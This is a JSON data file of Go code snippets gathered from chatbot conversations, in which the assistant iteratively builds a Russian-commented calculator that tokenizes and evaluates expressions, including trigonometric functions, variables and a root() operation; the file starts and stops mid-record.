    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"strconv\"\n\t\"strings\"\n)\n\nfunc main() {\n\treader := bufio.NewReader(os.Stdin)\n\n\tfor {\n\t\tfmt.Print(\"Введите выражение (или \\\"exit\\\" для завершения): \")\n\t\tinput, _ := reader.ReadString('\\n')\n\t\tinput = strings.TrimSpace(input)\n\n\t\tif input == \"exit\" {\n\t\t\tbreak\n\t\t}\n\n\t\tresult, err := evaluate(input)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Ошибка:\", err)\n\t\t} else {\n\t\t\tfmt.Println(\"Результат:\", result)\n\t\t}\n\t}\n}\n\nfunc evaluate(input string) (float64, error) {\n\ttokens := strings.Split(input, \" \")\n\n\tif len(tokens) != 3 {\n\t\treturn 0, fmt.Errorf(\"необходимо вводить два числа и один оператор\")\n\t}\n\n\ta, err := strconv.ParseFloat(tokens[0], 64)\n\tif err != nil {\n\t\treturn 0, fmt.Errorf(\"не удалось распознать первое число (a)\")\n\t}\n\n\tb, err := strconv.ParseFloat(tokens[2], 64)\n\tif err != nil {\n\t\treturn 0, fmt.Errorf(\"не удалось распознать второе число (b)\")\n\t}\n\n\tswitch tokens[1] {\n\tcase \"+\":\n\t\treturn a + b, nil\n\tcase \"-\":\n\t\treturn a - b, nil\n\tcase \"*\":\n\t\treturn a * b, nil\n\tcase \"/\":\n\t\tif b == 0 {\n\t\t\treturn 0, fmt.Errorf(\"деление на ноль невозможно\")\n\t\t}\n\t\treturn a / b, nil\n\tdefault:\n\t\treturn 0, fmt.Errorf(\"неизвестный оператор: %s\", tokens[1])\n\t}\n}",
    "filename": "563e57b314fcc30de9e73c1da6e5a6da_0.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "case expr[0] == '/':\n\t\tt = Token{Divide, \"/\"}\n\t\texpr = expr[1:]\n\tcase expr[0] == '(':\n\t\tt = Token{LeftParen, \"(\"}\n\t\texpr = expr[1:]\n\tcase expr[0] == ')':\n\t\tt = Token{RightParen, \")\"}\n\t\texpr = expr[1:]\n\tcase expr[0] == '^':\n\t\tt = Token{Power, \"^\"}\n\t\texpr = expr[1:]\n\tcase strings.HasPrefix(expr, \"sqrt\"):\n\t\tt = Token{Sqrt, \"sqrt\"}\n\t\texpr = expr[len(\"sqrt\"):]\n\tcase strings.HasPrefix(expr, \"sin\"):\n\t\tt = Token{Sin, \"sin\"}\n\t\texpr = expr[len(\"sin\"):]\n\tcase strings.HasPrefix(expr, \"cos\"):\n\t\tt = Token{Cos, \"cos\"}\n\t\texpr = expr[len(\"cos\"):]\n\tcase strings.HasPrefix(expr, \"tan\"):\n\t\tt = Token{Tan, \"tan\"}\n\t\texpr = expr[len(\"tan\"):]\n\tcase strings.HasPrefix(expr, \"cot\"):\n\t\tt = Token{Cot, \"cot\"}\n\t\texpr = expr[len(\"cot\"):]\n\tcase isDigit(rune(expr[0])):\n\t\tnum := strings.TrimLeftFunc(expr, isDigit)\n\t\tt = Token{Number, expr[:len(expr)-len(num)]}\n\t\texpr = num\n\tcase isLetter(rune(expr[0])):\n\t\tvarName := strings.TrimLeftFunc(expr, isLetter)\n\t\tt = Token{Variable, expr[:len(expr)-len(varName)]}\n\t\texpr = varName\n\tdefault:\n\t\treturn nil, fmt.Errorf(\"Неизвестный символ: %c\", expr[0])\n\t}\n\n\ttokens = append(tokens, t)\n}\n\nreturn tokens, nil\n}\n\n// Rest of the code remains the same",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_0.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n\texpr := \"(a) ^ (sin(1 / 3)) + b\"\n\ttokens, err := tokenize(expr)\n\tif err != nil {\n\t\tfmt.Println(\"Ошибка при токенизации:\", err)\n\t\treturn\n\t}\n\n\t// переменные и их значения\n\tvars := map[string]float64{\n\t\t\"a\": 3,\n\t\t\"b\": 2,\n\t}\n\n\tresult, err := eval(tokens, vars)\n\tif err != nil {\n\t\tfmt.Println(\"Ошибка при вычислении:\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"%s = %v\\n\", expr, result)\n}",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_1.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func eval(tokens []Token, vars map[string]float64) (float64, error) {\n\t// ... код выше остается прежним ...\n\n\tfor _, token := range tokens {\n\t\tswitch token.Type {\n\t\tcase Number:\n\t\t\tval, err := strconv.ParseFloat(token.Value, 64)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\t\t\tnumStack = append(numStack, val)\n\t\tcase Variable:\n\t\t\tval, ok := vars[token.Value]\n\t\t\tif !ok {\n\t\t\t\treturn 0, fmt.Errorf(\"Отсутствует значение для переменной: %v\", token.Value)\n\t\t\t}\n\t\t\tnumStack = append(numStack, val)\n                // ... код ниже остается прежним ...\n        }\n    }\n    // ... код ниже остается прежним ...\n}",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_2.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    expr := \"(a) ^ (sin(1 / 3)) + b\"\n    tokens, err := tokenize(expr)\n    if err != nil {\n        fmt.Println(\"Ошибка при токенизации:\", err)\n        return\n    }\n\n    // Переменные и их значения\n    vars := map[string]float64{\n        \"a\": 3,\n        \"b\": 2,\n    }\n\n    // Вызов с переменной\n    result, err := eval(tokens, vars)\n    if err != nil {\n        fmt.Println(\"Ошибка при вычислении:\", err)\n        return\n    }\n    fmt.Printf(\"%s (с переменными) = %v\\n\", expr, result)\n\n    // Вызов без переменной\n    exprNoVars := \"2 + 3 * 4\"\n    tokens, err = tokenize(exprNoVars)\n    \n    if err != nil {\n        fmt.Println(\"Ошибка при токенизации:\", err)\n        return\n    }\n\n    result, err = eval(tokens)\n    if err != nil {\n        fmt.Println(\"Ошибка при вычислении:\", err)\n        return\n    }\n    fmt.Printf(\"%s (без переменных) = %v\\n\", exprNoVars, result)\n}",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_5.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "func tokenize(expr string) ([]Token, error) {\n    // ... код выше остается прежним ...\n\n    case strings.HasPrefix(expr, \"root(\"):\n        t = Token{Root, \"root\"}\n        expr = expr[len(\"root\"):]\n    // ... код ниже остается прежним ...\n}",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_7.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    expr := \"root(3, 27)\" // Вычисляет кубический корень из 27\n    tokens, err := tokenize(expr)\n    if err != nil {\n        fmt.Println(\"Ошибка при токенизации:\", err)\n        return\n    }\n\n    result, err := eval(tokens)\n    if err != nil {\n        fmt.Println(\"Ошибка при вычислении:\", err)\n        return\n    }\n    fmt.Printf(\"%s = %v\\n\", expr, result)\n}",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_9.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "func tokenize(expr string) ([]Token, error) {\n    // ... код выше остается прежним ...\n\n    case expr[0] == ',':\n        t = Token{Comma, \",\"}\n        expr = expr[1:]\n    // ... код ниже остается прежним ...\n}",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_11.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 12,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "func eval(tokens []Token) (float64, error) {\n    // ... код выше остается прежним ...\n    for _, token := range tokens {\n        // ... Other cases ...\n        case Comma:\n            if len(tokens) > 0 && tokens[0].Type == Root {\n                op := tokens[0]\n                tokens = tokens[1:] // Remove the next root token from the list\n\n                // Process the root operation\n                args := []float64{popNumStack(), popNumStack()}\n                args[0], args[1] = args[1], args[0] // Reverse the order\n\n                res, err := applyOperation(op, args...)\n                if err != nil {\n                    return 0, err\n                }\n\n                numStack = append(numStack, res)\n            } else {\n                return 0, fmt.Errorf(\"Неправильное использование запятой\")\n            }\n        // ... Other cases ...\n    }\n    // ... код ниже остается прежним ...\n}",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_12.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 13,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    expr := \"root(3, 27)\" // Вычисляет кубический корень из 27\n    tokens, err := tokenize(expr)\n    if err != nil {\n        fmt.Println(\"Ошибка при токенизации:\", err)\n        return\n    }\n\n    result, err := eval(tokens)\n    if err != nil {\n        fmt.Println(\"Ошибка при вычислении:\", err)\n        return\n    }\n    fmt.Printf(\"%s = %v\\n\", expr, result)\n}",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_13.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 14,
    "language": "Go",
    "libraries": [],
    "code": "func eval(tokens []Token) (float64, error) {\n    // ... код выше остается прежним ...\n    for i := 0; i < len(tokens); i++ {\n        token := tokens[i]\n        switch token.Type {\n        // ... Other cases ...\n        case Comma:\n            if i+1 < len(tokens) && tokens[i+1].Type == Root {\n                op := tokens[i+1]\n\n                // Process the root operation\n                args := []float64{popNumStack(), popNumStack()}\n                args[0], args[1] = args[1], args[0] // Reverse the order\n\n                res, err := applyOperation(op, args...)\n                if err != nil {\n                    return 0, err\n                }\n\n                numStack = append(numStack, res)\n                i++ // Skip the next root token\n            } else {\n                return 0, fmt.Errorf(\"Неправильное использование запятой\")\n            }\n        // ... Other cases ...\n        }\n    }\n    // ... код ниже остается прежним ...\n}",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_14.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 15,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    expr := \"root(3, 27)\" // Вычисляет кубический корень из 27\n    tokens, err := tokenize(expr)\n    if err != nil {\n        fmt.Println(\"Ошибка при токенизации:\", err)\n        return\n    }\n\n    result, err := eval(tokens)\n    if err != nil {\n        fmt.Println(\"Ошибка при вычислении:\", err)\n        return\n    }\n    fmt.Printf(\"%s = %v\\n\", expr, result)\n}",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_15.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 16,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math\"\n\t\"strconv\"\n\t\"strings\"\n\t\"unicode\"\n)\n\n// Define all token types\ntype TokenType int\n\nconst (\n\tEOF TokenType = iota\n\tNumber\n\tPlus\n\tMinus\n\tMultiply\n\tDivide\n\tPower\n\tSqrt\n\tSin\n\tCos\n\tTan\n\tCot\n\tLeftParen\n\tRightParen\n\tVariable\n)\n\n// Token structure\ntype Token struct {\n\tType  TokenType\n\tValue string\n}\n\n// Function to check if a rune is a space\nfunc isSpace(r rune) bool {\n\treturn unicode.IsSpace(r)\n}\n\n// Function to check if a rune is a digit\nfunc isDigit(r rune) bool {\n\treturn unicode.IsDigit(r)\n}\n\n// Function to check if a rune is an operator\nfunc isOperator(r rune) bool {\n\treturn strings.ContainsRune(\"+-*/^\", r)\n}\n\n// Function to check if a rune is a letter\nfunc isLetter(r rune) bool {\n\treturn unicode.IsLetter(r)\n}\n\n// Function to convert an expression string into tokens\nfunc tokenize(expr string) ([]Token, error) {\n\tvar tokens []Token\n\tfor len(expr) > 0 {\n\t\texpr = strings.TrimSpace(expr)\n\t\tif len(expr) == 0 {\n\t\t\tbreak\n\t\t}\n\t\tvar t Token\n\t\tswitch {\n\t\tcase expr[0] == '+':\n\t\t\tt = Token{Plus, \"+\"}\n\t\t\texpr = expr[1:]\n\t\tcase expr[0] == '-':\n\t\t\tif isDigit(rune(expr[1])) {\n\t\t\t\tnum := strings.TrimLeftFunc(expr[1:], isDigit)\n\t\t\t\tt = Token{Number, \"-\" + expr[1:len(expr)-len(num)]}\n\t\t\t\texpr = num\n\t\t\t} else {\n\t\t\t\tt = Token{Minus, \"-\"}\n\t\t\t\texpr = expr[1:]\n\t\t\t}\n\t\tcase expr[0] == '*':\n\t\t\tt = Token{Multiply, \"*\"}\n\t\t\texpr = expr[1:]\n\t\tcase expr[0] == '/':\n\t\t\tt = Token{Divide, \"/\"}\n\t\t\texpr = expr[1:]\n\t\tcase expr[0] == '(':\n\t\t\tt = Token{LeftParen, \"(\"}\n\t\t\texpr = expr[1:]\n\t\tcase expr[0] == ')':\n\t\t\tt = Token{RightParen, \")\"}\n\t\t\texpr = expr[1:]\n\t\tcase expr[0] == '^':\n\t\t\tt = Token{Power, \"^\"}\n\t\t\texpr = expr[1:]\n\t\tcase strings.HasPrefix(expr, \"sqrt\"):\n\t\t\tt = Token{Sqrt, \"sqrt\"}\n\t\t\texpr = expr[len(\"sqrt\"):]\n\t\tcase strings.HasPrefix(expr, \"sin\"):\n\t\t\tt = Token{Sin, \"sin\"}\n\t\t\texpr = expr[len(\"sin\"):]\n\t\tcase strings.HasPrefix(expr, \"cos\"):\n\t\t\tt = Token{Cos, \"cos\"}\n\t\t\texpr = expr[len(\"cos\"):]\n\t\tcase strings.HasPrefix(expr, \"tan\"):\n\t\t\tt = Token{Tan, \"tan\"}\n\t\t\texpr = expr[len(\"tan\"):]\n\t\tcase strings.HasPrefix(expr, \"cot\"):\n\t\t\tt = Token{Cot, \"cot\"}\n\t\t\texpr = expr[len(\"cot\"):]\n\t\tcase isDigit(rune(expr[0])):\n\t\t\tnum := strings.TrimLeftFunc(expr, isDigit)\n\t\t\tt = Token{Number, expr[:len(expr)-len(num)]}\n\t\t\texpr = num\n\t\tcase isLetter(rune(expr[0])):\n\t\t\tvarName := strings.TrimLeftFunc(expr, isLetter)\n\t\t\tt = Token{Variable, expr[:len(expr)-len(varName)]}\n\t\t\texpr = varName\n\t\tdefault:\n\t\t\treturn nil, fmt.Errorf(\"Неизвестный символ: %c\", expr[0])\n\t\t}\n\n\t\ttokens = append(tokens, t)\n\t}\n\n\treturn tokens, nil\n}\n\n// Function to get the precedence of an operator\nfunc precedence(op TokenType) int {\n\tswitch op {\n\tcase Power:\n\t\treturn 4\n\tcase Sqrt, Sin, Cos, Tan, Cot:\n\t\treturn 3\n\tcase Multiply, Divide:\n\t\treturn 2\n\tcase Plus, Minus:\n\t\treturn 1\n\tcase LeftParen, RightParen:\n\t\treturn 0\n\tdefault:\n\t\treturn 0\n\t}\n}\n\n// Function to evaluate an expression given its tokens\nfunc eval(tokens []Token) (float64, error) {\n\tapplyOperation := func(op Token, args ...float64) (float64, error) {\n\t\tswitch op.Type {\n\t\tcase Plus:\n\t\t\treturn args[0] + args[1], nil\n\t\tcase Minus:\n\t\t\treturn args[0] - args[1], nil\n\t\tcase Multiply:\n\t\t\treturn args[0] * args[1], nil\n\t\tcase Divide:\n\t\t\treturn args[0] / args[1], nil\n\t\tcase Power:\n\t\t\treturn math.Pow(args[0], args[1]), nil\n\t\tcase Sqrt:\n\t\t\treturn math.Sqrt(args[0]), nil\n\t\tcase Sin:\n\t\t\treturn math.Sin(args[0]), nil\n\t\tcase Cos:\n\t\t\treturn math.Cos(args[0]), nil\n\t\tcase Tan:\n\t\t\treturn math.Tan(args[0]), nil\n\t\tcase Cot:\n\t\t\treturn 1 / math.Tan(args[0]), nil\n\t\tdefault:\n\t\t\treturn 0, fmt.Errorf(\"Неизвестная операция: %v\", op.Value)\n\t\t}\n\t}\n\n\tvar numStack []float64\n\tvar opStack []Token\n\n\tpopNumStack := func() float64 {\n\t\tval := numStack[len(numStack)-1]\n\t\tnumStack = numStack[:len(numStack)-1]\n\t\treturn val\n\t}\n\n\tfor _, token := range tokens {\n\t\tswitch token.Type {\n\t\tcase Number:\n\t\t\tval, err := strconv.ParseFloat(token.Value, 64)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\t\t\tnumStack = append(numStack, val)\n\t\tcase Variable:\n\t\t\tval, ok := vars[token.Value]\n\t\t\tif !ok {\n\t\t\t\treturn 0, fmt.Errorf(\"Отсутствует значение для переменной: %v\", token.Value)\n\t\t\t}\n\t\t\tnumStack = append(numStack, val)\n\t\t// ... код ниже остается прежним ...\n\t\t}\n\t}\n\n\t// ... код ниже остается прежним ...\n}\n\nfunc main() {\n\texpr := \"27^(1/3)\" // Вычисляет кубический корень из 27\n\ttokens, err := tokenize(expr)\n\tif err != nil {\n\t\tfmt.Println(\"Ошибка при токенизации:\", err)\n\t\treturn\n\t}\n\n\tresult, err := eval(tokens)\n\tif err != nil {\n\t\tfmt.Println(\"Ошибка при вычислении:\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"%s = %v\\n\", expr, result)\n}",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_16.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 17,
    "language": "Go",
    "libraries": [],
    "code": "func tokenize(expr string) ([]Token, error) {\n\t// ... код выше остается прежним ...\n\n\t// Обновленный случай для обработки чисел и чисел с плавающей точкой\n\tcase isDigit(rune(expr[0])) || (expr[0] == '.' && len(expr) > 1 && isDigit(rune(expr[1]))):\n\t\t// Найдите длину числовой последовательности\n\t\tvar numLen int\n\t\tfor ; numLen < len(expr) && (isDigit(rune(expr[numLen])) || expr[numLen] == '.'); numLen++ {\n\t\t}\n\t\tt = Token{Number, expr[:numLen]}\n\t\texpr = expr[numLen:]\n\t// ... код ниже остается прежним ...\n}",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_17.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 18,
    "language": "Go",
    "libraries": [],
    "code": "func eval(tokens []Token) (float64, error) {\n\t// ... код выше остается прежним ...\n\tfor i := 0; i < len(tokens); i++ {\n\t\ttoken := tokens[i]\n\t\tswitch token.Type {\n\t\t// ... другие случаи ...\n\t\tcase Comma:\n\t\t\tif i+1 < len(tokens) && tokens[i+1].Type == Root {\n\t\t\t\top := tokens[i+1]\n\n\t\t\t\t// Обработка операции root\n\t\t\t\targs := []float64{popNumStack(), popNumStack()}\n\t\t\t\targs[0], args[1] = args[1], args[0] // Поменять местами\n\n\t\t\t\tres, err := applyOperation(op, args...)\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn 0, err\n\t\t\t\t}\n\n\t\t\t\tnumStack = append(numStack, res)\n\t\t\t\ti += 2 // Пропустить следующий символ root и запятую\n\t\t\t} else {\n\t\t\t\treturn 0, fmt.Errorf(\"Неправильное использование запятой\")\n\t\t\t}\n\t\t// ... другие случаи ...\n\t\t}\n\t}\n\t// ... код ниже остается прежним ...\n}",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_18.go"
  },
  {
    "conversation_hash": "424f3d25adc325ae7d397f1c45d96ebe",
    "code_index": 19,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n\texpr := \"root(3, 27) + 2.5\" // Вычисляет кубический корень из 27 и добавляет 2.5\n\ttokens, err := tokenize(expr)\n\tif err != nil {\n\t\tfmt.Println(\"Ошибка при токенизации:\", err)\n\t\treturn\n\t}\n\n\tresult, err := eval(tokens)\n\tif err != nil {\n\t\tfmt.Println(\"Ошибка при вычислении:\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"%s = %v\\n\", expr, result)\n}",
    "filename": "424f3d25adc325ae7d397f1c45d96ebe_19.go"
  },
  {
    "conversation_hash": "efb7c45154fd5535a31d113336a4646f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "case Root:\n\t\t\t// Обработка операции root\n\t\t\tif len(numStack) < 2 {\n\t\t\t\treturn 0, fmt.Errorf(\"Недостаточно аргументов для операции root\")\n\t\t\t}\n\t\t\targs := []float64{popNumStack(), popNumStack()}\n\t\t\targs[0], args[1] = args[1], args[0] // Поменять местами\n\t\t\tres, err := applyOperation(token, args...)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\t\t\tnumStack = append(numStack, res)\n\n\t\t\t// Пропустить следующий символ открывающей скобки '('\n\t\t\ti++\n\t\t\tif i < len(tokens)-1 && tokens[i].Type == LeftParen {\n\t\t\t\t// Сделать ничего\n\t\t\t} else {\n\t\t\t\treturn 0, fmt.Errorf(\"Некорректный формат операции root\")\n\t\t\t}",
    "filename": "efb7c45154fd5535a31d113336a4646f_0.go"
  },
  {
    "conversation_hash": "efb7c45154fd5535a31d113336a4646f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "expr := \"root(3, 27)\" // Вычисляет кубический корень из 27\n\ttokens, err := tokenize(expr)\n\tif err != nil {\n\t\tfmt.Println(\"Ошибка при токенизации:\", err)\n\t\treturn\n\t}\n\n\tresult, err := eval(tokens)\n\tif err != nil {\n\t\tfmt.Println(\"Ошибка при вычислении:\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"%s = %v\\n\", expr, result)",
    "filename": "efb7c45154fd5535a31d113336a4646f_1.go"
  },
  {
    "conversation_hash": "077d7eb821aab714ba8b19b200c0259d",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "case Comma:\n    if i+1 < len(tokens) && tokens[i+1].Type == Root {\n        // Just skip the comma\n    } else {\n        return 0, fmt.Errorf(\"Incorrect usage of comma\")\n    }",
    "filename": "077d7eb821aab714ba8b19b200c0259d_0.go"
  },
  {
    "conversation_hash": "077d7eb821aab714ba8b19b200c0259d",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "case Comma:\n\tif i+1 < len(tokens) && tokens[i+1].Type != LeftParen {\n\t\t// Push both numbers onto numStack before processing the root operation\n\t\tnumStack = append(numStack, popNumStack())\n\t} else {\n\t\treturn 0, fmt.Errorf(\"Incorrect usage of comma\")\n\t}",
    "filename": "077d7eb821aab714ba8b19b200c0259d_1.go"
  },
  {
    "conversation_hash": "077d7eb821aab714ba8b19b200c0259d",
    "code_index": 3,
    "language": "Go",
    "libraries": [
      "it"
    ],
    "code": "case Root:\n    // Process the root operation\n    // Skip if not enough arguments\n    if len(numStack) < 2 {\n        return 0, fmt.Errorf(\"Not enough arguments for the root operation\")\n    }\n\n    // Pop the second argument first and remove the comma from it\n    secondArg := popNumStack()\n    tokens = append(tokens[:i], tokens[i+1:]...)\n\n    // Evaluate the arguments\n    args := []float64{popNumStack(), secondArg}\n    res, err := applyOperation(token, args...)\n    if err != nil {\n        return 0, err\n    }\n\n    numStack = append(numStack, res)\n\n    // Skip the next ')' token\n    i += 1",
    "filename": "077d7eb821aab714ba8b19b200c0259d_3.go"
  },
  {
    "conversation_hash": "077d7eb821aab714ba8b19b200c0259d",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "case Root:\n    // Move the ')' token to its correct location\n    j := i + 1\n    for open := 1; open != 0 && j < len(tokens); j++ {\n        if tokens[j].Type == LeftParen {\n            open++\n        }\n        if tokens[j].Type == RightParen {\n            open--\n        }\n    }\n    if j == len(tokens) {\n        return 0, fmt.Errorf(\"Mismatched parentheses\")\n    }\n    tokens = append(tokens[:j-1], append([]Token{Token{Comma, \",\"}}, tokens[j-1:]...)...)\n\n    // Skip the \"root(\" token and process the remaining token as usual\n    i++",
    "filename": "077d7eb821aab714ba8b19b200c0259d_5.go"
  },
  {
    "conversation_hash": "077d7eb821aab714ba8b19b200c0259d",
    "code_index": 10,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "case Root:\n    // Skip the \"root(\" token first\n    i++\n\n    // Process the root operation\n    if len(numStack) < 2 {\n        return 0, fmt.Errorf(\"Not enough arguments for the root operation\")\n    }\n\n    // Process the tokens until the next comma or the next right parenthesis\n    j := i\n    for open := 1; open != 0 && j < len(tokens); j++ {\n        if tokens[j].Type == LeftParen {\n            open++\n        }\n        if tokens[j].Type == RightParen {\n            open--\n        }\n    }\n    if j == len(tokens) {\n        return 0, fmt.Errorf(\"Mismatched parentheses\")\n    }\n\n    // Save the second part of tokens\n    tokensRight := tokens[j:]\n\n    // Remove the comma from the tokens list\n    tokens = tokens[:j-1]\n\n    // Recursively process both parts\n    res1, err := eval(tokens[i:])\n    if err != nil {\n        return 0, err\n    }\n\n    res2, err := eval(tokensRight)\n    if err != nil {\n        return 0, err\n    }\n\n    // Evaluate the root operation\n    args := []float64{res1, res2}\n    res, err := applyOperation(token, args...)\n    if err != nil {\n        return 0, err\n    }\n    \n    // Set the result to numStack and break the loop\n    numStack = append(numStack[:len(numStack)-2], res)\n    break",
    "filename": "077d7eb821aab714ba8b19b200c0259d_10.go"
  },
  {
    "conversation_hash": "077d7eb821aab714ba8b19b200c0259d",
    "code_index": 12,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "case Root:\n    // Skip the \"root(\" token first\n    i++\n\n    // Remove the comma from the tokens list\n    j := i\n    open := 1\n    for ; open != 0 && j < len(tokens); j++ {\n        if tokens[j].Type == LeftParen {\n            open++\n        }\n        if tokens[j].Type == RightParen {\n            open--\n        }\n        if open == 1 && tokens[j].Type == Comma {\n            tokens = append(tokens[:j], tokens[j+1:]...)\n            break\n        }\n    }\n    if j == len(tokens) {\n        return 0, fmt.Errorf(\"Mismatched parentheses\")\n    }\n\n    // Don't break from the loop and continue to process tokens",
    "filename": "077d7eb821aab714ba8b19b200c0259d_12.go"
  },
  {
    "conversation_hash": "c31ef846f3c429199fac4706bf9f22ce",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "case Root:\n    // Save the start position of the index for parsing the root arguments later\n    rootIndex := i\n    \n    // Skip the “root(” token first\n    i++\n\n    // Remove the comma from the tokens list and count the number of opened and closed parentheses\n    j := i\n    open := 1\n    for ; open != 0 && j < len(tokens); j++ {\n        if tokens[j].Type == LeftParen {\n            open++\n        }\n        if tokens[j].Type == RightParen {\n            open--\n        }\n        if open == 1 && tokens[j].Type == Comma {\n            tokens = append(tokens[:j], tokens[j+1:]...)\n            break\n        }\n    }\n    if j == len(tokens) {\n        return 0, fmt.Errorf(\"Mismatched parentheses\")\n    }\n\n    // Evaluate the first argument of root (the base)\n    baseTokens := tokens[rootIndex+1 : j-1]\n    base, err := eval(baseTokens)\n    if err != nil {\n        return 0, err\n    }\n\n    // Evaluate the second argument of root (the value)\n    valueTokens := tokens[j:]\n    value, err := eval(valueTokens)\n    if err != nil {\n        return 0, err\n    }\n\n    // Calculate the result and push it to numStack\n    result, err := applyOperation(Token{Root, \"root\"}, base, value)\n    if err != nil {\n        return 0, err\n    }\n    numStack = append(numStack, result)\n\n    // Skip the rest of the root tokens\n    i = len(tokens) - 1",
    "filename": "c31ef846f3c429199fac4706bf9f22ce_0.go"
  },
  {
    "conversation_hash": "c31ef846f3c429199fac4706bf9f22ce",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "case Root:\n    // Save the start position of the index for parsing the root arguments later\n    rootIndex := i\n    \n    // Skip the “root(” token first\n    i++\n\n    // Find the position of the comma separating the arguments of root\n    j := i\n    open := 1\n    for ; open != 0 && j < len(tokens); j++ {\n        if tokens[j].Type == LeftParen {\n            open++\n        }\n        if tokens[j].Type == RightParen {\n            open--\n        }\n        if open == 1 && tokens[j].Type == Comma {\n            break\n        }\n    }\n    if j == len(tokens) {\n        return 0, fmt.Errorf(\"Mismatched parentheses\")\n    }\n\n    // Evaluate the first argument of root (the base)\n    baseTokens := tokens[rootIndex+1 : j]\n    base, err := eval(baseTokens)\n    if err != nil {\n        return 0, err\n    }\n\n    // Evaluate the second argument of root (the value)\n    valueTokens := tokens[j+1:]\n    \n    // Find the position of the closing parenthesis\n    k := j+1\n    open = 1\n    for ; open != 0 && k < len(tokens); k++ {\n        if tokens[k].Type == LeftParen {\n            open++\n        }\n        if tokens[k].Type == RightParen {\n            open--\n        }\n    }\n    if k == len(tokens) {\n        return 0, fmt.Errorf(\"Mismatched parentheses\")\n    }\n\n    valueTokens = tokens[j+1 : k-1]\n    value, err := eval(valueTokens)\n    if err != nil {\n        return 0, err\n    }\n\n    // Calculate the result and push it to numStack\n    result, err := applyOperation(Token{Root, \"root\"}, base, value)\n    if err != nil {\n        return 0, err\n    }\n    numStack = append(numStack, result)\n\n    // Skip the rest of the root tokens\n    i = k - 1",
    "filename": "c31ef846f3c429199fac4706bf9f22ce_1.go"
  },
  {
    "conversation_hash": "3a769d191e79dee73b16a50d036e20be",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
